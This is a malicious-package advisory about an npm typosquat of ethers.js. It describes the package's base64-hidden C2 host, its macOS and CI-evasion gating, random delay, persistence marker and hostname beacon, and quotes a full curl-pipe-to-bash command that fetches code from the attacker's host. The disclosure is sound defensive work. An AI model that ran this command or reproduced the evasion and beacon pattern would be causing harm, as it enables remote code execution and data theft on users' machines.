summary: Ethers.js typosquat fetches and executes remote shell payload from base64-hidden C2 on require()
details: On require('@403name/ether-js'), an IIFE in index.js decodes a base64-obfuscated C2 host (https://k7xm9q.xyz), gates execution to macOS, skips CI and GitHub Actions environments, sleeps a random 30–90 seconds, and writes a once-only marker to ~/.cache/.nyx-npm/e for persistence. It then issues a beacon GET to https://k7xm9q.xyz/api/clickfix-callback carrying the installer's $USER, os.hostname(), and a generated beacon id, and finally spawns `/bin/sh -c 'curl -sSfL https://k7xm9q.xyz/api/payload/ | /bin/bash'` — fetching and executing arbitrary attacker-controlled shell code under the installer's user account. The package masquerades as a lightweight ethers.js-compatible utility library to lure users of the popular `ethers` package; the advertised utility functions act as cover for the hidden remote-execution IIFE. The combination of base64-obfuscated C2 host, platform/CI evasion gating, random delay, persistence marker, host-identifier exfiltration, and pipe-to-bash of remote content is unambiguous active-attack tradecraft.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
